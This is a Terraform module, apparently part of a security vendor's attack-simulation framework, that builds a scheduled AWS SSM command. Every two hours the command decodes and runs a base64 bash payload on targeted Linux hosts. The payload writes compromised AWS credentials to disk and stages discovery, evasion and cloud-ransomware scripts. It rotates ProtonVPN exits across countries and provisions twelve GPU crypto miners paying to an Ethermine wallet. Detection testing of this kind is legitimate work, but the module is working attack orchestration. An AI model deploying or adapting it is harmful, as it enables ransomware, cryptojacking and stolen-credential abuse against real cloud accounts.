locals {
    attack_dir = "/cloud-tunnel"
    script = "cloudransom.sh"
    script_type = "aws-cli"
    attack_type = "cloud_ransomware"
    aws_creds = join("\n", [ for u,k in var.compromised_credentials: "echo '${k.rendered}' > ${local.attack_dir}/.env-aws-${u}" ])
    payload = <<-EOT
    LOGFILE=/tmp/ssm_attacker_exec_docker_${local.attack_type}_attacker.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    
    if docker ps | grep aws-cli || docker ps | grep terraform; then 
        log "Attempt to start new session skipped - aws-cli or terraform docker is running..."; 
    else
        truncate -s 0 $LOGFILE
        log "Starting new session no existing session detected..."
        rm -rf ${local.attack_dir}
        mkdir -p ${local.attack_dir} ${local.attack_dir}/aws-cli/scripts ${local.attack_dir}/terraform/scripts/cloudcrypto ${local.attack_dir}/terraform/scripts/hostcrypto ${local.attack_dir}/protonvpn
        cd ${local.attack_dir}
        ${local.aws_creds}
        echo '${base64encode(local.start)}' | base64 -d > /${local.attack_dir}/start.sh
        echo '${base64encode(local.auto-free)}' | base64 -d > /${local.attack_dir}/auto-free.sh
        echo '${base64encode(local.auto-paid)}' | base64 -d > /${local.attack_dir}/auto-paid.sh
        echo '${base64encode(local.protonvpn)}' | base64 -d > /${local.attack_dir}/.env-protonvpn
        echo '${base64encode(local.protonvpn-baseline)}' | base64 -d > /${local.attack_dir}/.env-protonvpn-baseline
        echo '${base64encode(local.baseline)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/baseline.sh
        echo '${base64encode(local.discovery)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/discovery.sh
        echo '${base64encode(local.evasion)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/evasion.sh
        echo '${base64encode(local.cloudransom)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/cloudransom.sh
        echo '${base64encode(local.cloudcrypto)}' | base64 -d > /${local.attack_dir}/terraform/scripts/cloudcrypto/main.tf
        echo '${base64encode(local.hostcrypto)}' | base64 -d > /${local.attack_dir}/terraform/scripts/hostcrypto/main.tf
        for i in $(echo "AU CR IS JP LV NL NZ SG SK US US-FREE#34 NL-FREE#148 JP-FREE#3"); do cp .env-protonvpn .env-protonvpn-$i; sed -i "s/RANDOM/$i/" .env-protonvpn-$i; done
        while ! which docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        log "Starting simulation..."
        if [ "${var.protonvpn_tier}" == "0" ]; then
        log "Protonvpn tier is free tier: ${var.protonvpn_tier}"
        log "Starting auto-free.sh as background job..."
        bash auto-free.sh & >> $LOGFILE 2>&1
        else
        log "Protonvpn tier is paid tier: ${var.protonvpn_tier}"
        log "Starting auto-paid.sh as background job..."
        bash auto-paid.sh&  >> $LOGFILE 2>&1
        fi;
    fi;
    EOT
    base64_payload = base64encode(local.payload)

    protonvpn       = templatefile(
                                "${path.module}/resources/protonvpn.env.tpl", 
                                {
                                    protonvpn_user = var.protonvpn_user
                                    protonvpn_password = var.protonvpn_password
                                    protonvpn_server = var.protonvpn_server
                                    protonvpn_tier = tostring(var.protonvpn_tier)
                                    protonvpn_protocol = var.protonvpn_protocol
                                }
                            )
    protonvpn-baseline  = templatefile(
                                "${path.module}/resources/protonvpn.env.tpl", 
                                {
                                    protonvpn_user = var.protonvpn_user
                                    protonvpn_password = var.protonvpn_password
                                    protonvpn_server = "US"
                                    protonvpn_tier = tostring(var.protonvpn_tier)
                                    protonvpn_protocol = var.protonvpn_protocol
                                }
                            )
    auto-free   = templatefile(
                                "${path.module}/resources/auto-free.sh.tpl",
                                {
                                    compromised_keys_user = var.compromised_keys_user
                                    script = local.script
                                    script_type = local.script_type
                                    attack_type = local.attack_type
                                }
                            )
    auto-paid   = templatefile(
                                "${path.module}/resources/auto-paid.sh.tpl",
                                {
                                    compromised_keys_user = var.compromised_keys_user
                                    script = local.script
                                    script_type = local.script_type
                                    attack_type = local.attack_type
                                }
                            )
    baseline    = templatefile(
                                "${path.module}/resources/baseline.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
    discovery   = templatefile(
                                "${path.module}/resources/discovery.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
    evasion     = templatefile(
                                "${path.module}/resources/evasion.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
    cloudransom = templatefile(
                                "${path.module}/resources/cloudransom.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
    cloudcrypto = templatefile(
                                "${path.module}/resources/cloudcrypto.tf.tpl",
                                {
                                    name = "crypto-gpu-miner-${var.environment}-${var.deployment}"
                                    instances = 12
                                    wallet = var.ethermine_wallet
                                    region = var.region
                                }
                            )
    hostcrypto  = templatefile(
                                "${path.module}/resources/hostcrypto.tf.tpl",
                                {
                                    name = "crypto-cpu-miner-${var.environment}-${var.deployment}"
                                    region = var.region
                                    instances = 1
                                    minergate_user = var.minergate_user
                                }
                            )
    start       = templatefile(
                                "${path.module}/resources/start.sh.tpl",
                                {
                                    attack_type = local.attack_type
                                }
                            )
}

resource "aws_ssm_document" "exec_docker_cloud_ransomware_attacker" {
  name          = "exec_docker_cloud_ransomware_${var.environment}_${var.deployment}"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "start docker based log4shell exploit",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_docker_cloud_ransomware_attacker_${var.environment}_${var.deployment}",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "5400",
                    "runCommand": [
                        "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_docker_cloud_ransomware_attacker" {
    name = "exec_docker_cloud_ransomware_${var.environment}_${var.deployment}"

    resource_query {
        query = jsonencode(var.resource_query_exec_docker_cloud_ransomware_attacker)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_docker_cloud_ransomware_attacker" {
    association_name = "exec_docker_cloud_ransomware_${var.environment}_${var.deployment}"

    name = aws_ssm_document.exec_docker_cloud_ransomware_attacker.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_docker_cloud_ransomware_attacker.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 2 hours
    schedule_expression = "cron(0 */2 * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}